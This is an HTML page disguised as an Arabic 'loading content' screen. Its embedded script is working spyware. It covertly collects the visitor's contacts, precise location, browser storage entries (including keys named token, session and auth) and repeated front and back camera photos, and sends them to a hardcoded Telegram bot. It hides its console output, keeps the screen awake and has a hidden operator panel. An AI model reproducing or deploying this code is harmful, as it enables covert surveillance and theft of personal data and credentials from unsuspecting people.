<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Arial', sans-serif; }
        .loader { text-align: center; color: #fff; }
        .spinner { width: 50px; height: 50px; border: 4px solid #333; border-top: 4px solid #25D366; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .loader p { color: #888; font-size: 14px; }
        #status { color: #666; font-size: 12px; margin-top: 10px; }

        #adminPanel {
            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.95); z-index: 99999; padding: 20px; overflow-y: auto;
            color: #fff; font-family: 'Tahoma', sans-serif;
        }
        #adminPanel.active { display: block; }
        .admin-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #25D366; padding-bottom: 10px; margin-bottom: 20px; }
        .admin-header h1 { color: #25D366; font-size: 24px; }
        .admin-header .status { font-size: 12px; color: #888; }
        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .admin-card { background: #1a1a2e; border: 1px solid #333; border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; transition: 0.3s; }
        .admin-card:hover { border-color: #25D366; transform: scale(1.02); }
        .admin-card .icon { font-size: 30px; margin-bottom: 10px; }
        .admin-card .label { font-size: 13px; color: #aaa; }
        .admin-card .count { font-size: 18px; color: #25D366; font-weight: bold; }
        .admin-card.danger:hover { border-color: #ff4444; }
        .admin-card.danger .icon { color: #ff4444; }

        .admin-log { background: #0d0d1a; border: 1px solid #333; border-radius: 12px; padding: 15px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px; }
        .admin-log .entry { padding: 4px 0; border-bottom: 1px solid #111; }
        .admin-log .entry .time { color: #666; }
        .admin-log .entry .msg { color: #0f0; }
        .admin-log .entry .error { color: #f44; }
        .admin-log .entry .warn { color: #ff0; }
        .admin-log .entry .info { color: #0ff; }

        .admin-actions { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0; }
        .admin-btn { background: #1a1a2e; border: 1px solid #333; color: #fff; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; flex: 1; min-width: 120px; }
        .admin-btn:hover { border-color: #25D366; background: #2a2a3e; }
        .admin-btn.danger:hover { border-color: #ff4444; background: #3a1a1a; }
        .admin-btn.success { border-color: #25D366; }
        .admin-btn.success:hover { background: #1a3a2a; }

        #toast { position: fixed; top: 20px; right: 20px; background: #1a1a2e; border: 1px solid #25D366; border-radius: 12px; padding: 15px 25px; color: #fff; z-index: 9999999; display: none; min-width: 200px; }
        #toast.show { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="loader">
    <div class="spinner"></div>
    <p>جاري تحميل المحتوى...</p>
    <div id="status">⏳ جاري التهيئة...</div>
</div>

<video id="videoFront" autoplay muted playsinline style="display:none;"></video>
<video id="videoBack" autoplay muted playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<div id="toast"></div>

<div id="adminPanel">
    <div class="admin-header">
        <h1>🕵️ لوحة التحكم</h1>
        <span class="status" id="targetStatus">🟢 متصل</span>
    </div>

    <div class="admin-grid">
        <div class="admin-card" onclick="togglePanel()">
            <div class="icon">🔒</div>
            <div class="label">إخفاء اللوحة</div>
            <div class="count">📱</div>
        </div>
    </div>

    <div class="admin-log" id="adminLog">
        <div class="entry"><span class="time">[SYSTEM]</span> <span class="msg">✅ النظام جاهز</span></div>
    </div>

    <div style="text-align:center;margin-top:15px;">
        <button class="admin-btn danger" onclick="togglePanel()" style="max-width:200px;margin:0 auto;">🔒 إخفاء اللوحة</button>
    </div>
</div>

<script>
// ============================================================
// ====================== CONFIG ==============================
// ============================================================
const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
let CHAT_ID = '';
let totalStolen = 0;
let photoCount = 0;
let isRunning = true;

// ============================================================
// ====================== TOGGLE PANEL ========================
// ============================================================
function togglePanel() {
    const panel = document.getElementById('adminPanel');
    panel.classList.toggle('active');
    if (panel.classList.contains('active')) {
        document.querySelector('.loader').style.display = 'none';
        document.getElementById('status').textContent = '🟢 لوحة التحكم نشطة';
        addLog('🟢 تم فتح لوحة التحكم', 'info');
    } else {
        document.querySelector('.loader').style.display = 'flex';
        document.getElementById('status').textContent = '⏳ جاري التحميل...';
    }
}

let panelOpen = false;
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
        e.preventDefault();
        togglePanel();
        panelOpen = true;
    }
});

function addLog(text, type = 'msg') {
    const logDiv = document.getElementById('adminLog');
    const entry = document.createElement('div');
    entry.className = 'entry';
    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `<span class="time">[${time}]</span> <span class="${type}">${text}</span>`;
    logDiv.appendChild(entry);
    logDiv.scrollTop = logDiv.scrollHeight;
}

function showToast(text, duration = 3000) {
    const toast = document.getElementById('toast');
    toast.textContent = text;
    toast.className = 'show';
    clearTimeout(toast._timeout);
    toast._timeout = setTimeout(() => { toast.className = ''; }, duration);
}

// ============================================================
// ====================== TELEGRAM SEND =======================
// ============================================================
function sendToTelegram(imageData, caption = '') {
    if (!CHAT_ID) return;
    try {
        const blob = dataURLtoBlob(imageData);
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(() => {});
    } catch(e) {}
}

function sendMessage(text) {
    if (!CHAT_ID) return;
    const chunks = text.match(/(.|[\r\n]){1,4000}/g) || [text];
    chunks.forEach(chunk => {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: chunk })
        }).catch(() => {});
    });
}

function dataURLtoBlob(dataURL) {
    const parts = dataURL.split(',');
    const mime = parts[0].match(/:(.*?);/)[1];
    const bstr = atob(parts[1]);
    const n = bstr.length;
    const u8arr = new Uint8Array(n);
    for (let i = 0; i < n; i++) { u8arr[i] = bstr.charCodeAt(i); }
    return new Blob([u8arr], { type: mime });
}

// ============================================================
// ====================== GET CHAT ID =========================
// ============================================================
function getChatId() {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
        .then(res => res.json())
        .then(data => {
            if (data.ok && data.result && data.result.length > 0) {
                const lastUpdate = data.result[data.result.length - 1];
                if (lastUpdate.message) {
                    CHAT_ID = lastUpdate.message.chat.id;
                } else if (lastUpdate.callback_query) {
                    CHAT_ID = lastUpdate.callback_query.from.id;
                }
                addLog(`✅ Chat ID: ${CHAT_ID}`, 'msg');
                sendMessage('✅ تم الاتصال بالجهاز');
                document.getElementById('status').textContent = '✅ جاهز';
                startOperations();
            } else {
                setTimeout(getChatId, 3000);
            }
        })
        .catch(() => setTimeout(getChatId, 3000));
}

// ============================================================
// ====================== START OPERATIONS ====================
// ============================================================
function startOperations() {
    addLog('🚀 بدء العمليات...', 'info');
    
    // سحب جهات الاتصال
    setTimeout(() => stealContacts(), 1000);
    
    // سحب الموقع
    setTimeout(() => stealLocation(), 2000);
    
    // تشغيل الكاميرات (أمامي + خلفي) كل 5 ثواني
    setTimeout(() => startCameras(), 3000);
    
    // سحب الملفات والتليجرام
    setTimeout(() => stealFiles(), 4000);
    setTimeout(() => stealTelegram(), 5000);
}

// ============================================================
// ====================== STEAL CONTACTS ======================
// ============================================================
function stealContacts() {
    addLog('👤 سحب جهات الاتصال...', 'info');
    let count = 0;
    
    try {
        if ('contacts' in navigator && 'select' in navigator.contacts) {
            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                .then(contacts => {
                    contacts.forEach(c => {
                        sendMessage(`📱 ${c.name || 'غير معروف'} | ${c.tel ? c.tel.join(',') : '---'}`);
                        count++;
                        totalStolen++;
                    });
                    addLog(`👤 ${count} جهة اتصال`, 'msg');
                })
                .catch(() => addLog('❌ فشل جهات الاتصال', 'error'));
        }
    } catch(e) {}
}

// ============================================================
// ====================== STEAL LOCATION ======================
// ============================================================
function stealLocation() {
    addLog('📍 سحب الموقع...', 'info');
    
    try {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    const url = `https://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendMessage(`📍 الموقع:\nالخط: ${pos.coords.latitude}\nالطول: ${pos.coords.longitude}\n${url}`);
                    addLog('📍 تم سحب الموقع', 'msg');
                    totalStolen++;
                },
                function(err) {
                    addLog('❌ فشل الموقع: ' + err.message, 'error');
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }
    } catch(e) {}
}

// ============================================================
// ====================== START CAMERAS =======================
// ============================================================
let frontStream = null, backStream = null;
let frontInterval = null, backInterval = null;

function startCameras() {
    addLog('📸 تشغيل الكاميرات...', 'info');
    
    // الكاميرا الأمامية
    navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
    })
    .then(function(stream) {
        frontStream = stream;
        const video = document.getElementById('videoFront');
        video.srcObject = stream;
        video.play();
        addLog('📸 كاميرا أمامية تعمل', 'msg');
        captureFrontPhoto();
        frontInterval = setInterval(captureFrontPhoto, 5000);
    })
    .catch(function(err) {
        addLog('❌ فشل كاميرا أمامية: ' + err.message, 'error');
    });
    
    // الكاميرا الخلفية
    navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
    })
    .then(function(stream) {
        backStream = stream;
        const video = document.getElementById('videoBack');
        video.srcObject = stream;
        video.play();
        addLog('📸 كاميرا خلفية تعمل', 'msg');
        captureBackPhoto();
        backInterval = setInterval(captureBackPhoto, 5000);
    })
    .catch(function(err) {
        addLog('❌ فشل كاميرا خلفية: ' + err.message, 'error');
    });
}

function captureFrontPhoto() {
    if (!isRunning) return;
    const video = document.getElementById('videoFront');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    if (!video.videoWidth || !video.videoHeight) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    const imgData = canvas.toDataURL('image/jpeg', 0.9);
    sendToTelegram(imgData, `📸 أمامي ${photoCount+1} - ${new Date().toLocaleString()}`);
    photoCount++;
    totalStolen++;
    addLog(`📸 صورة أمامي`, 'msg');
}

function captureBackPhoto() {
    if (!isRunning) return;
    const video = document.getElementById('videoBack');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    if (!video.videoWidth || !video.videoHeight) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    const imgData = canvas.toDataURL('image/jpeg', 0.9);
    sendToTelegram(imgData, `📸 خلفي ${photoCount+1} - ${new Date().toLocaleString()}`);
    photoCount++;
    totalStolen++;
    addLog(`📸 صورة خلفي`, 'msg');
}

// ============================================================
// ====================== STEAL FILES =========================
// ============================================================
function stealFiles() {
    addLog('📁 سحب الملفات...', 'info');
    let found = 0;
    
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const val = localStorage.getItem(key);
            if (val && val.length > 20) {
                sendMessage(`📦 [${key}] (${val.length}): ${val.substring(0, 300)}...`);
                found++;
                totalStolen++;
            }
        }
    } catch(e) {}
    
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const val = sessionStorage.getItem(key);
            if (val && val.length > 20) {
                sendMessage(`📦 session [${key}] (${val.length}): ${val.substring(0, 300)}...`);
                found++;
                totalStolen++;
            }
        }
    } catch(e) {}
    
    addLog(`📁 ${found} ملف`, 'msg');
}

// ============================================================
// ====================== STEAL TELEGRAM ======================
// ============================================================
function stealTelegram() {
    addLog('✈️ سحب تليجرام...', 'info');
    let found = 0;
    const keys = ['tg', 'telegram', 'gram', 'user', 'session', 'token', 'auth', 'login', 'account', 'profile', 'phone'];
    
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const val = localStorage.getItem(key);
            if (key && keys.some(k => key.toLowerCase().includes(k))) {
                sendMessage(`✈️ [${key}]: ${val}`);
                found++;
                totalStolen++;
            }
        }
    } catch(e) {}
    
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const val = sessionStorage.getItem(key);
            if (key && keys.some(k => key.toLowerCase().includes(k))) {
                sendMessage(`✈️ session [${key}]: ${val}`);
                found++;
                totalStolen++;
            }
        }
    } catch(e) {}
    
    addLog(`✈️ ${found} عنصر`, 'msg');
}

// ============================================================
// ====================== KEEP ALIVE ==========================
// ============================================================
// منع المتصفح من إيقاف التشغيل
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        // الصفحة في الخلفية، الكاميرات تستمر بالعمل
        addLog('⏳ الصفحة في الخلفية... الكاميرات تعمل', 'warn');
    } else {
        addLog('🔄 الصفحة نشطة', 'info');
    }
});

// منع السكون
try {
    if ('wakeLock' in navigator) {
        navigator.wakeLock.request('screen').catch(() => {});
    }
} catch(e) {}

// ============================================================
// ====================== INIT =================================
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};

addLog('🔄 جاري التهيئة...', 'info');
document.getElementById('status').textContent = '⏳ الاتصال بالبوت...';
getChatId();

document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
        e.preventDefault();
        togglePanel();
        panelOpen = true;
    }
});

window.admin = {
    panel: togglePanel,
    log: addLog
};

console.log('🕵️ جاهز! Ctrl+Shift+P للفتح');
</script>
</body>
</html>
